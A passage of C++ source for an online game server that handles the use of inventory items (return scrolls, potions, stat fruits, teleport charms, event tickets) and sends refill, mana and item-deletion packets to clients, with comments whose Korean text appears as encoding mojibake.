			{	// ��üũ
#ifdef ADD_SHIELD_POINT_01_20060403
				GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1, (WORD)gObj[aIndex].iShield);
#else
				GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1);
#endif
				return;
			}	

			if( gObj[aIndex].Dexterity+gObj[aIndex].AddDexterity < citem->m_RequireDexterity )
			{	// ��øüũ
#ifdef ADD_SHIELD_POINT_01_20060403
				GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1, (WORD)gObj[aIndex].iShield);
#else
				GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1);
#endif
				return;
			}	
#endif

#ifdef ADD_SKILL_WITH_COMBO
			if( citem->m_Type == MAKE_ITEMNUM(15,18) )
			{	// �����Ʈ ������ 3�� ����Ʈ�� Ŭ���� �ؾ߸� ���� �ִ�
				if( g_QuestInfo.GetQuestState(&gObj[aIndex], 2) != QS_CLEAR )
				{
#ifdef ADD_SHIELD_POINT_01_20060403
					GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1, (WORD)gObj[aIndex].iShield);
#else
					GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1);
#endif
					return;
				}
			}
#endif

#ifdef ADD_CHECKING_LEVEL_TO_LEARN_MAGIC_20041115
			// ���� üũ
			if( (citem->m_Type >= MAKE_ITEMNUM(12,8) ) && (citem->m_Type <= MAKE_ITEMNUM(12,24) ) )
			{
				if( gObj[aIndex].Level < citem->m_RequireLevel )
				{
#ifdef ADD_SHIELD_POINT_01_20060403
					GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1, (WORD)gObj[aIndex].iShield);
#else
					GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1);
#endif
					return;
				}
			}
#endif

			BYTE skillnumber;
			// ������ ����... (�߰������ְ�)
#ifdef ADD_THIRD_WING_20070525	// IsClass ����
			if( citem->IsClass( gObj[aIndex].Class, gObj[aIndex].ChangeUP, gObj[aIndex].ThirdChangeUp ) == FALSE ) 
#else
#ifdef NEW_SKILL_FORSKYLAND
			if( citem->IsClass(gObj[aIndex].Class, gObj[aIndex].ChangeUP) == FALSE ) 
#else
			if( citem->IsClass(gObj[aIndex].Class) == FALSE ) 
#endif
#endif	// ADD_THIRD_WING_20070525
			{
				GCInventoryItemDeleteSend(aIndex, 0xFF, 1);
			}
			else
			{				
				int addskill = gObjMagicAdd(&gObj[aIndex], (citem->m_Type>>ITEM_BITSHIFT), (citem->m_Type%MAX_ITEM_INDEX), (BYTE)citem->m_Level, skillnumber);
				if( addskill >= 0 )
				{
					gObjInventoryItemSet(aIndex, pos, 0xFF);
					GCMagicListOneSend(aIndex, addskill, skillnumber, (BYTE)citem->m_Level, 0);
					gObj[aIndex].pInventory[pos].Clear();
					GCInventoryItemDeleteSend(aIndex, pos, 1);
				}
				else {
					// �����̴�..
					GCInventoryItemDeleteSend(aIndex, 0xFF, 1);
				}
			}
		}
		else if( citem->m_Type == MAKE_ITEMNUM(14,10) )	// ���� ��ȯ ����
		{

			LogAddTD( "[Using Item] [Return Scroll] [%s][%s] - Current Map:[%d]", gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].MapNumber );

#ifdef FOR_BLOODCASTLE
			if (CHECK_BLOODCASTLE(gObj[aIndex].MapNumber))	// ���� ĳ���� ��� => �̺�Ʈ �������� �ִ��� ã�Ƽ� ������.
			{
#ifdef ADD_BLOODCASTLE_FOR_MASTER_LEVEL_20071010	// ����ĳ�� �ٸ� �ε��� ����
				int iBridgeIndex = g_BloodCastle.GetBridgeIndexByMapNum( gObj[aIndex].MapNumber );
				if (g_BloodCastle.GetCurrentState( iBridgeIndex ) == BLOODCASTLE_STATE_PLAYING) {
#else
				if (g_BloodCastle.GetCurrentState(gObj[aIndex].MapNumber - MAP_INDEX_BLOODCASTLE1) == BLOODCASTLE_STATE_PLAYING) {
#endif
					// ����ĳ�� ������ �������̶�� ���빫�⸦ ã�Ƽ� ������.
					g_BloodCastle.SearchUserDropQuestItem(aIndex);
				}
				else {
					// ����ĳ�� ������ �������� �ƴ϶�� ���빫�⸦ ã�Ƽ� ���ش�.
					g_BloodCastle.SearchUserDeleteQuestItem(aIndex);
				}
			}
#endif

#ifdef ADD_EVENT_MAP_ILLUSION_TEMPLE_20070328		// ���� ��ȯ���� ���� ����ϰ�� ���� ����
			if(CHECK_ILLUSION_TEMPLE(gObj[aIndex].MapNumber))
			{
				g_IllusionTempleEvent.DropRelicsItem(gObj[aIndex].MapNumber, aIndex);
			}
#endif

			if( gObj[aIndex].m_IfState.use ) 
			{
				if( gObj[aIndex].m_IfState.type == I_SHOP )	// ���� �ŷ����̾��ٸ�..
				{
					gObj[aIndex].TargetShopNumber = -1;		// �����ŷ��� ����Ѵ�.
					gObj[aIndex].m_IfState.type   = 0;
					gObj[aIndex].m_IfState.use    = 0;
				}
			}



			gObjInventoryItemSet(aIndex, pos, 0xFF);
			gObj[aIndex].pInventory[pos].Clear();
			GCInventoryItemDeleteSend(aIndex, pos, 1);


			
			if( gObj[aIndex].MapNumber == 2 )		// �����ʿ� ������ ���� ������..
			{
				gObjMoveGate(aIndex, 22);
			}
			else if( gObj[aIndex].MapNumber == 3 )	// ���� ������ ������ ����������
			{
				gObjMoveGate(aIndex, 27);
			}
			else if( gObj[aIndex].MapNumber == 4 )	// ž1�� ��������� �̵�
			{
				gObjMoveGate(aIndex, 42);
			}
			else if( gObj[aIndex].MapNumber == 7 )	// ��Ʋ���� ��������� �̵�
			{
				gObjMoveGate(aIndex, 49);
			}
			else if( gObj[aIndex].MapNumber == 8 )	// Ÿ��ĭ ��������� �̵�
			{
				gObjMoveGate(aIndex, 57);
			}
#ifdef FOR_BLOODCASTLE
			else if(CHECK_BLOODCASTLE(gObj[aIndex].MapNumber))	// ����ĳ�� �̾��ٸ� ����ƽ��� �̵�
			{
				gObjMoveGate(aIndex, 22);
			}
#endif
#ifdef CHAOSCASTLE_SYSTEM_20040408
			else if(CHECK_CHAOSCASTLE(gObj[aIndex].MapNumber))	// ī����ĳ�� �̾��ٸ� ����ƽ��� �̵�
			{
				gObjMoveGate(aIndex, 22);
			}
#endif
#ifdef ADD_NEW_MAP_KALIMA_20040518
			else if(CHECK_KALIMAMAP(gObj[aIndex].MapNumber))	// Į�������ٸ� ���̾ƽ��� �̵�
			{
				gObjMoveGate(aIndex, 22);
			}
#endif
#ifdef ADD_NEW_MAP_AIDA_20050617
			else if( gObj[aIndex].MapNumber == MAP_INDEX_AIDA )
			{
				gObjMoveGate(aIndex, 27);						// ���̴ٿ��ٸ� �븮�Ʒ� �̵�
			}
#endif
#ifdef ADD_NEW_MAP_CRYWOLF_FIRSTZONE_20050414
			else if( gObj[aIndex].MapNumber == MAP_INDEX_CRYWOLF_FIRSTZONE )
			{
				gObjMoveGate(aIndex, 27);						// ũ���̿��� 1�����̾��ٸ� �븮�Ʒ� �̵�
			}
#endif
#ifdef ADD_SEASON_3_NEW_CHARACTER_SUMMONER_20070912				// �������� ���ٸ� ���������
			else if( gObj[aIndex].MapNumber == MAP_INDEX_ELBELAND )
			{
				gObjMoveGate(aIndex, 267);
			}
#endif		
#ifdef UPDATE_NEWMAP_SWAMP_OF_CALMNESS_20080108					// ����Ǵ��̸� ����� ������
			else if( gObj[aIndex].MapNumber == MAP_INDEX_SWAMP_OF_CALMNESS )	
			{
				gObjMoveGate(aIndex, 273);
			}
#endif				
#ifdef ADD_RAKLION_20080408										// ��Ŭ�����̸� ��Ŭ���� ���������
			else if( gObj[aIndex].MapNumber == MAP_INDEX_RAKLION_FIELD )	
			{
				gObjMoveGate(aIndex, 286);
			}
#endif // ADD_RAKLION_20080408
#ifdef ADD_NEWPVP_PKFIELD										// ��ī������ �������� ��� 
			else if( g_NewPVP.IsVulcanusMap(gObj[aIndex].MapNumber) )
			{
#ifdef FOR_JAPAN
				gObjMoveGate(aIndex, LORENCIA_DEFAULT_REGEN_MAP_GATE);
#else // FOR_JAPAN
				gObjMoveGate(aIndex, NEWPVP_DEFAULT_REGEN_MAP_GATE);
#endif // FOR_JAPAN
			}
			else if( g_NewPVP.IsPKFieldMap(gObj[aIndex].MapNumber) )
			{
				g_NewPVP.Reset(gObj[aIndex]);
#ifdef FOR_JAPAN
				gObjMoveGate(aIndex, LORENCIA_DEFAULT_REGEN_MAP_GATE);
#else // FOR_JAPAN
				gObjMoveGate(aIndex, NEWPVP_DEFAULT_REGEN_MAP_GATE);
#endif // FOR_JAPAN
			}
#endif // ADD_NEWPVP_PKFIELD
#ifdef CASTLE_MAIN_SCHEDULER_20041111		// ������ȯ���� ��� �� �������̾��ٸ� ������ ������ҷ� �̵�
			else if (gObj[aIndex].MapNumber == MAP_INDEX_CASTLESIEGE) {
				if (g_CastleSiege.GetCastleState() == CASTLESIEGE_STATE_STARTSIEGE) {
					if (gObj[aIndex].m_btCsJoinSide == CS_SIEGESIDE_DEFEND) {
						gObjMoveGate(aIndex, 101);
					}
					else {
						gObjMoveGate(aIndex, 100);
					}
				}
				else {
					if (g_CastleSiege.CheckCastleOwnerMember(aIndex) == TRUE ||
						g_CastleSiege.CheckCastleOwnerUnionMember(aIndex) == TRUE
						) {
						gObjMoveGate(aIndex, 101);
					}
					else {
						gObjMoveGate(aIndex, 100);
					}
				}
			}
#endif
			
			else gObjMoveGate(aIndex, 17);
		}
		else if( citem->m_Type == MAKE_ITEMNUM(14,9) )	// ���� ����ߴ�..
		{
			int level = citem->m_Level;

			gObjInventoryItemSet(aIndex, pos, 0xFF);
			gObj[aIndex].pInventory[pos].Clear();
			GCInventoryItemDeleteSend(aIndex, pos, 1);
			gObjUseDrink(&gObj[aIndex], level);
		}
		else if( citem->m_Type == MAKE_ITEMNUM(14,20) )	// ����� ����
		{
#ifdef JAPAN_1ST_ANIVERSARY_BOX_20040531				// ����� ���࿡ ������ +1 ~ +6 ������ �Ϻ� ���� ����� �����̴�.
			if (citem->m_Level == 0) {
				gObjInventoryItemSet(aIndex, pos, 0xFF);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
				gObjUseDrink(&gObj[aIndex], 2);
			}
#else
			gObjInventoryItemSet(aIndex, pos, 0xFF);
			gObj[aIndex].pInventory[pos].Clear();
			GCInventoryItemDeleteSend(aIndex, pos, 1);
			gObjUseDrink(&gObj[aIndex], 2);
#endif
		}
		else if( citem->m_Type == MAKE_ITEMNUM(13,15) )	// ����..
		{
#ifdef ADD_MINUS_STAT_SYSTEM_USING_FRUIT_20050712
// * Circle ���� ���ŷ� �̸��� �ٲ����. ^^

			// 0) ���� ������ ���
			if( iItemUseType == 0x00 )
				gObjUsePlusStatFruit(aIndex, pos);
			// 1) ���� ������ ���
			else if( iItemUseType == 0x01)
				gObjUseMinusStatFruit(aIndex, pos);
#else
			gObjUseCircle(aIndex, pos);
#endif
		}

#ifdef ADD_PCS_FRUITS_POINT_EXTENTION_20070430
		else if( citem->m_Type == MAKE_ITEMNUM( 13, 54 )		// �� ���� ����
			|| citem->m_Type == MAKE_ITEMNUM( 13, 55 )			// ��ø ���� ����
			|| citem->m_Type == MAKE_ITEMNUM( 13, 56 )			// ü�� ���� ����
			|| citem->m_Type == MAKE_ITEMNUM( 13, 57 )			// ������ ���� ����
			|| citem->m_Type == MAKE_ITEMNUM( 13, 58 )			// ��� ���� ����
			   )		// Ȯ�� ����
		{
			gObjUseExMinusFruit( &gObj[aIndex], pos );
		}
#endif // ADD_PCS_FRUITS_POINT_EXTENTION_20070430

#ifdef ADD_PCS_IMPROVE_POTION_20070718
		else if( citem->m_Type == MAKE_ITEMNUM( 14, 78 )
			|| citem->m_Type == MAKE_ITEMNUM( 14, 79 )
			|| citem->m_Type == MAKE_ITEMNUM( 14, 80 )
			|| citem->m_Type == MAKE_ITEMNUM( 14, 81 )
			|| citem->m_Type == MAKE_ITEMNUM( 14, 82 )
				)
		{
			gObjUseImprovePotion( &gObj[aIndex], pos );
		}
#endif // ADD_PCS_IMPROVE_POTION_20070718

#ifdef ADD_PCS_INDULGENCE_20070504
		else if( citem->m_Type == MAKE_ITEMNUM( 14, 72 ) )		// ���˺�
		{
			gObjUseIndulgence( &gObj[aIndex], pos );
		}
#endif // ADD_PCS_INDULGENCE_20070504

#ifdef ADD_FULL_RECOVERY_POTION_20070719
		else if( citem->m_Type == MAKE_ITEMNUM( 14, 70 )
			|| citem->m_Type == MAKE_ITEMNUM( 14, 71 )
				)
		{
			gObjUseFullRecoveryPotion( &gObj[aIndex], pos );
		}
#endif // ADD_FULL_RECOVERY_POTION_20070719

#ifdef MODIFY_BUFF_SYSTEM_EXTENTION_CASHSHOP_20080318
		else if ( citem->m_Type == MAKE_ITEMNUM( 14, 94 )		// �߰�����Ʈġ�Ṱ��
			)
		{
			gObjUseRecoveryPotion( &gObj[aIndex], pos, (float)0.65 );
		}
#endif // MODIFY_BUFF_SYSTEM_EXTENTION_CASHSHOP_20080318

#ifndef GAME_VERSION == G_V_99B
#ifdef ADD_ELITE_SD_POTION_20090918
		else if ( citem->m_Type == MAKE_ITEMNUM( 14, 133 )		// ����Ʈ SD ȸ�� ����
			)
		{
			gObjUseRecoveryPotion( &gObj[aIndex], pos, (float)0.65 );
		}
#endif // ADD_ELITE_SD_POTION_20090918
#endif // GAME_VERSION (99B) CHECK

#ifdef ADD_EVENT_CHERRYBLOSSOM_20080312		// ���ɳ��� �̺�Ʈ
		else if ( citem->m_Type == MAKE_ITEMNUM( 14, 85 )
			|| citem->m_Type == MAKE_ITEMNUM( 14, 86 )
			|| citem->m_Type == MAKE_ITEMNUM( 14, 87 )
			)
		{
			int iBuffType = BUFFTYPE_NONE;
			if( citem->m_Type == MAKE_ITEMNUM( 14, 85 ) )		iBuffType = BUFFTYPE_CHERRYBLOSSOM_DRINK;	//���ɼ�
			else if( citem->m_Type == MAKE_ITEMNUM( 14, 86 ) )	iBuffType = BUFFTYPE_CHERRYBLOSSOM_DUMPLING;//���ɳ��� ���
			else if( citem->m_Type == MAKE_ITEMNUM( 14, 87 ) )	iBuffType = BUFFTYPE_CHERRYBLOSSOM_PETAL;	//���� ����

			if( gObjSearchItemMinus( &gObj[aIndex], pos, 1 ) == FALSE )
			{
				gObjInventoryItemSet( aIndex, pos, 0xFF );
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend( aIndex, pos, 1 );
			}

			gObjAddBuffEffect( &gObj[aIndex], iBuffType);
#ifndef MODIFY_JOL_BLESS_POTION_USE_EFFECT_20061030
			GCReFillSend( aIndex, (WORD)(gObj[aIndex].MaxLife + gObj[aIndex].AddLife), 0xFE, 0, (WORD)(gObj[aIndex].iMaxShield+gObj[aIndex].iAddShield));
			GCManaSend( aIndex, (short)(gObj[aIndex].MaxMana+gObj[aIndex].AddMana), 0xFE, 0, gObj[aIndex].MaxBP+gObj[aIndex].AddBP);
#endif	
		}
#endif // ADD_EVENT_CHERRYBLOSSOM_20080312

#ifdef ADD_NEW_ITEM_FOR_CASTLE_01_20041116
		else if( citem->m_Type == MAKE_ITEMNUM(14,7) ) // �ູ�� ����, ��ȥ�� ���� ��� ó��.
		{
			//������ �������� ������ �̸� ������ �㵵�� ���� - riverstyx
			int iLevel = citem->m_Level;
			int iSerial = citem->GetNumber();
			int iDur = citem->m_Durability;

			if( gObjSearchItemMinus( &gObj[aIndex], pos, 1) == FALSE )
			{
				gObjInventoryItemSet(aIndex, pos, 0xFF);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}

#ifdef EXTEND_LOG_SYSTEM_03_20060816
			if( gObj[aIndex].lpGuild != NULL )
			{
				LogAddTD("[CastleSiege] Using CastleSiege Potion Lv[%d]/Si[%d]/Dur[%d] - [%s][%s] - (Guild : %s)", 
					iLevel, iSerial, iDur, gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].lpGuild->Name);
			}
			else
			{
				LogAddTD("[CastleSiege] Using CastleSiege Potion Lv[%d]/Si[%d]/Dur[%d] - [%s][%s]", 
					iLevel, iSerial, iDur, gObj[aIndex].AccountID, gObj[aIndex].Name );
			}
#else
			LogAddTD("[CastleSiege] Using CastleSiege Potion Lv[%d]/Si[%d]/Dur[%d] - [%s][%s]", 
				iLevel, iSerial, iDur, gObj[aIndex].AccountID, gObj[aIndex].Name );
#endif // EXTEND_LOG_SYSTEM_03_20060816

			if( iLevel == 0 ) // �ູ�� ���� 
			{
				gObjUseBlessAndSoulPotion( aIndex, iLevel );
			}
			else if( iLevel == 1 ) // ��ȥ�� ����
			{
				gObjUseBlessAndSoulPotion( aIndex, iLevel );
			}
		}
#endif
#ifdef ADD_PCS_EVENT_MAP_FREE_TICKET_20070110
		// Į���� ���� �����
		else if( citem->m_Type == MAKE_ITEMNUM( 13, 48 ) )
		{
			if( ( gObj[aIndex].MapNumber < MAP_INDEX_KALIMA1 || gObj[aIndex].MapNumber > MAP_INDEX_KALIMA6 )
				&& gObj[aIndex].MapNumber != MAP_INDEX_KALIMA7 )
			{
				int iLevel = g_KalimaGate.GetKalimaGateLevel2( aIndex );
				int iSerial = citem->GetNumber();
				int iDuration = citem->m_Durability;
				BOOL bKalimaGateCreateResult = FALSE;
				int iKalimaGateX = 0;
				int iKalimaGateY = 0;

				iLevel = iLevel + 1;

				// ����� �ֺ� 3ĭ �̳��� ������ ��ȯ�Ѵ�.
				iKalimaGateX = ( gObj[aIndex].X - 2 ) + ( rand() % 6 );
				iKalimaGateY = ( gObj[aIndex].Y - 2 ) + ( rand() % 6 );

				bKalimaGateCreateResult = g_KalimaGate.CreateKalimaGate( aIndex, iLevel, iKalimaGateX, iKalimaGateY );
				if( bKalimaGateCreateResult == TRUE )
				{
					// Į���� ����Ʈ ����
					if( gObjSearchItemMinus( &gObj[aIndex], pos, 1 ) == FALSE )
					{
						gObjInventoryItemSet( aIndex, pos, 0xFF );
						gObj[aIndex].pInventory[pos].Clear();
						GCInventoryItemDeleteSend( aIndex, pos, 1 );
					}

					LogAddTD("[PCS] Use Free Kalima Ticket Success");
				}
				else
				{
					// Į���� ����Ʈ ���� ����
	#ifdef MODIFY_KALIMA_FREETICKET_USE_RESULT_20070830
					GCItemDurSend( aIndex, pos, gObj[aIndex].pInventory[pos].m_Durability, 1 );
	#endif // MODIFY_KALIMA_FREETICKET_USE_RESULT_20070830
					LogAddTD("[PCS] Use Free Kalima Ticket Failed");
				}
			}
		}
		//------------->
		//20080930 �ؿ� 5�� �κ�����ȭ ��Ȱ, �̵� ���� (grooving)
	#ifdef ADD_TELEPORT_CHARM_ITEM_20080930	
		else if( citem->m_Type == MAKE_ITEMNUM(13, 69) )// ��Ȱ ����
		{
			BOOL bCheckEquipmentToMove = gMoveCommand.CheckEquipmentToMove( &gObj[aIndex], gObj[aIndex].m_siDieRegenMapIndex );

			if ( !CHECK_BLOODCASTLE(gObj[aIndex].MapNumber) && !CHECK_CHAOSCASTLE(gObj[aIndex].MapNumber) 
				&& !CHECK_KALIMAMAP(gObj[aIndex].MapNumber) && !CHECK_DEVILSQUARE(gObj[aIndex].MapNumber)
				&& !CHECK_ILLUSION_TEMPLE(gObj[aIndex].MapNumber) 
				&& (gObj[aIndex].MapNumber != MAP_INDEX_CASTLESIEGE) &&  (gObj[aIndex].MapNumber != MAP_INDEX_CASTLEHUNTZONE)
				&& TRUE == bCheckEquipmentToMove
				)
			{
				gObjTeleport( aIndex, gObj[aIndex].m_siDieRegenMapIndex, gObj[aIndex].m_siDieRegenX, gObj[aIndex].m_siDieRegenY );
				
				gObjInventoryItemSet( aIndex, pos, 0xFF );
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend( aIndex, pos, 1 );

				LogAddTD("[Using Item] [Charm of Raise] [%s][%s] Die Position Map:[%d] X:[%d] Y:[%d]", 
				gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].m_siDieRegenMapIndex, gObj[aIndex].m_siDieRegenX, gObj[aIndex].m_siDieRegenY);
				gObj[aIndex].m_siDieRegenMapIndex	=	0;
				gObj[aIndex].m_siDieRegenX			=	0;
				gObj[aIndex].m_siDieRegenY			=	0;

				GCServerCmd(aIndex, 60, 0, 0);
			}
			else
			{
				char msg[255];						
				wsprintf(msg, lMsg.Get(1252));	// �̵��Ҽ� �����ϴ�
				GCServerMsgStringSend(msg, aIndex, 1);
			}
		}						
		else if( citem->m_Type == MAKE_ITEMNUM(13, 70) )//�̵��Ǻ���
		{
			BOOL bCheckEquipmentToMove = gMoveCommand.CheckEquipmentToMove( &gObj[aIndex], gObj[aIndex].m_siMoveMapIndex );

			if( gIsMoveCharmEnable(gObj[aIndex].MapNumber) == TRUE && 
				TRUE == bCheckEquipmentToMove
				)
			{		
				if( gObjSearchItemMinus( &gObj[aIndex], pos, 1 ) == FALSE )// �������� ���ٸ� �̵���Ű�� ������ ����
				{
					gObjTeleport( aIndex, gObj[aIndex].m_siMoveMapIndex, gObj[aIndex].m_siMoveX, gObj[aIndex].m_siMoveY );
					
					gObjInventoryItemSet( aIndex, pos, 0xFF );
					gObj[aIndex].pInventory[pos].Clear();
					GCInventoryItemDeleteSend( aIndex, pos, 1 );

					gObj[aIndex].m_siMoveX		=		0;
					gObj[aIndex].m_siMoveY		=		0;
					gObj[aIndex].m_siMoveMapIndex =		0;	
					
					GCServerCmd(aIndex, 61, 0, 0);
					LogAddTD("[Using Item] [Charm of Move] [%s][%s]", gObj[aIndex].AccountID, gObj[aIndex].Name);
				}
				else// ���� ����� ��ġ ����
				{
					gObj[aIndex].m_siMoveX			=	gObj[aIndex].X;
					gObj[aIndex].m_siMoveY			=	gObj[aIndex].Y;
					gObj[aIndex].m_siMoveMapIndex	=	gObj[aIndex].MapNumber;

					LogAddTD("[Using Item] [Charm of Move - SavePosition] [%s][%s] Map:[%d] X:[%d] Y:[%d]",
						gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].m_siMoveMapIndex, gObj[aIndex].m_siMoveX, gObj[aIndex].m_siMoveY );
				}				
			}
			else
			{
				char msg[255];						
				wsprintf(msg, lMsg.Get(1252));	// �̵��Ҽ� �����ϴ�
				GCServerMsgStringSend(msg, aIndex, 1);
			}
		}	
	#endif //ADD_TELEPORT_CHARM_ITEM_20080930
		//<-------------
#endif // ADD_PCS_EVENT_MAP_FREE_TICKET_20070110

		//------------->
		//20081013 �ؿ� ũ�������� �̺�Ʈ - ��Ÿ�Ǹ��� �ʴ��� (grooving)
#ifdef UPDATE_XMASEVENT_MAP_20080930
		else if( citem->m_Type == MAKE_ITEMNUM(13, 66) )//��Ÿ�Ǹ��� �ʴ���
		{
#ifdef MODIFY_SANTACLAUSVILLAGE_VISITLEVEL
			if (gObj[aIndex].Level < 15)
			{
				GCServerMsgStringSend(lMsg.Get(2613), aIndex, 1);
			} 
			else
			{
				gObjTeleport( aIndex, MAP_INDEX_XMASEVENT, 220, 20 );
				
				if( gObjSearchItemMinus( &gObj[aIndex], pos, 1 ) == FALSE )
				{
					gObjInventoryItemSet( aIndex, pos, 0xFF );
					gObj[aIndex].pInventory[pos].Clear();
					GCInventoryItemDeleteSend( aIndex, pos, 1 );
				}
			}
#else
			gObjTeleport( aIndex, MAP_INDEX_XMASEVENT, 220, 20 );
			
			if( gObjSearchItemMinus( &gObj[aIndex], pos, 1 ) == FALSE )
			{
				gObjInventoryItemSet( aIndex, pos, 0xFF );
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend( aIndex, pos, 1 );
			}
#endif // MODIFY_SANTACLAUSVILLAGE_VISITLEVEL
		}
#endif	//UPDATE_XMASEVENT_MAP_20080930
		//<-------------
#ifdef ADD_PARTIALY_CHARGE_SYSTEM_06_20090129
		else if( citem->m_Type == MAKE_ITEMNUM(13, 81) ) { // ���� 6�� ��ȣ������ (��ȣ�� ����, ������ ��ȣ ������ ����. 			
#ifdef MODIFY_CHARM_GUARDIAN_CHARM_PROTECTITEM_NON_DUPLICATION_20090720
			for( int iBuffIndex = 0 ; iBuffIndex < gObj[aIndex].m_BuffEffectCount ; iBuffIndex++ )
			{
				// ��ȣ�� ������ �ߺ� ����� �ȵǵ���
				if( gObj[aIndex].m_BuffEffectList[iBuffIndex].BuffIndex == BUFFTYPE_CHARM_GUARDIAN )
				{
					GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1, (WORD)gObj[aIndex].iShield);
					return;
				}
			}
#endif // MODIFY_CHARM_GUARDIAN_CHARM_PROTECTITEM_NON_DUPLICATION_20090720

			g_CashItemPeriodSystem.GDReqPeriodItemInsert(&gObj[aIndex],citem->m_Type,ITEM_EFFECTDATE_USE_FILE);
			
			gObjInventoryItemSet( aIndex, pos, 0xFF );
			gObj[aIndex].pInventory[pos].Clear();
			GCInventoryItemDeleteSend( aIndex, pos, 1);			
		} else if( citem->m_Type == MAKE_ITEMNUM(13, 82) ) {			
#ifdef MODIFY_CHARM_GUARDIAN_CHARM_PROTECTITEM_NON_DUPLICATION_20090720
			for( int iBuffIndex = 0 ; iBuffIndex < gObj[aIndex].m_BuffEffectCount ; iBuffIndex++ )
			{
				// ��ȣ�� ������ �ߺ� ����� �ȵǵ���
				if( gObj[aIndex].m_BuffEffectList[iBuffIndex].BuffIndex == BUFFTYPE_CHARM_PROTECTITEM )
				{
					GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1, (WORD)gObj[aIndex].iShield);
					return;
				}
			}
#endif // MODIFY_CHARM_GUARDIAN_CHARM_PROTECTITEM_NON_DUPLICATION_20090720

			g_CashItemPeriodSystem.GDReqPeriodItemInsert(&gObj[aIndex],citem->m_Type,ITEM_EFFECTDATE_USE_FILE);
			
			gObjInventoryItemSet( aIndex, pos, 0xFF );
			gObj[aIndex].pInventory[pos].Clear();
			GCInventoryItemDeleteSend( aIndex, pos, 1);			
		}
#endif
		else
		{
			LogAdd("error-L3 : %s return %s %d %d %s", gObj[aIndex].Name, __FILE__, __LINE__, pos, citem->GetName());


#ifdef ADD_SHIELD_POINT_01_20060403
			GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1, (WORD)gObj[aIndex].iShield);
#else
			GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1);
#endif
			
			//char szTemp[256];
			//wsprintf(szTemp, " %d ��° ������ ��� ����", pos);
			//GCServerMsgStringSend(szTemp, aIndex, 1);
		}
	}
	else
	{
#ifdef ADD_SHIELD_POINT_01_20060403
		GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1, (WORD)gObj[aIndex].iShield);
#else
		GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1);
#endif

		LogAdd("error-L3 : %s return %s %d %d", gObj[aIndex].Name, __FILE__, __LINE__, pos);
		//char szTemp[256];
		//wsprintf(szTemp, " %d ��° ������ ��� ����", pos);
		//GCServerMsgStringSend(szTemp, aIndex, 1);
	}
}

//////////////////////////////////////////////////////////////////////////////
// [0x26] ĳ���Ϳ��� ������� �ٽ� ä���ش�.
#ifdef ADD_SHIELD_POINT_01_20060403
void GCReFillSend(int aIndex, WORD Life, BYTE Ipos, BYTE flag, WORD wShield)
{
	PMSG_REFILL pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x26, sizeof( pMsg ) );
	pMsg.IPos       = Ipos;
	pMsg.LifeH		= HIBYTE(Life);
	pMsg.LifeL		= LOBYTE(Life);
	pMsg.btShieldH	= HIBYTE(wShield);
	pMsg.btShieldL	= LOBYTE(wShield);
	pMsg.Flag		= 0;

#ifdef SHIELD_POINT_DEBUGLOG
	char Msg[256];
	sprintf(Msg, "[Shield] HP : %d, SD : %d", Life, wShield );
	if( Ipos == 0xFE )
	{
		strcat( Msg, " INIT");
	}
	GCServerMsgStringSend( Msg, aIndex, 1 );
#endif
	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}
#else
void GCReFillSend(int aIndex, WORD Life, BYTE Ipos, BYTE flag)
{
	PMSG_REFILL	pMsg;
	
	PHeadSetB((LPBYTE)&pMsg, 0x26, sizeof( pMsg ));
	pMsg.IPos       = Ipos;
	pMsg.LifeH		= HIBYTE(Life);
	pMsg.LifeL		= LOBYTE(Life);
	pMsg.Flag		= 0;
	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}
#endif

//////////////////////////////////////////////////////////////////////////////
// [0x27] ĳ���Ϳ��� ���� ���� �˸���.
void GCManaSend(int aIndex, short Mana, BYTE Ipos, BYTE flag, WORD BP)
{
	if( aIndex < 0  || aIndex > MAX_OBJECT-1 ) 
	{
		LogAdd("GCManaSend() return %s %d", __FILE__, __LINE__);
		return;
	}
	if( gObj[aIndex].Type != OBJTYPE_CHARACTER ) 
	{
		//LogAdd("%s return %s %d", gObj[aIndex].Name, __FILE__, __LINE__);
		return;
	}

	PMSG_MANASEND	pMsg;
	
	PHeadSetB((LPBYTE)&pMsg, 0x27, sizeof( pMsg ));
	pMsg.IPos       = Ipos;
	pMsg.ManaH		= HIBYTE(Mana);
	pMsg.ManaL		= LOBYTE(Mana);
#ifdef NEW_FORSKYLAND2
	pMsg.BPH		= HIBYTE(BP);
	pMsg.BPL		= LOBYTE(BP);
#endif

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}	

//////////////////////////////////////////////////////////////////////////////
// [0x28] �κ��丮�� Ư�� ��ġ�� �������� ������Ų��.
void GCInventoryItemDeleteSend(int aIndex, BYTE pos, BYTE flag)
{
	PMSG_INVENTORYDELETE	pMsg;
	
	PHeadSetB((LPBYTE)&pMsg, 0x28, sizeof( pMsg ));
	pMsg.IPos       = pos;
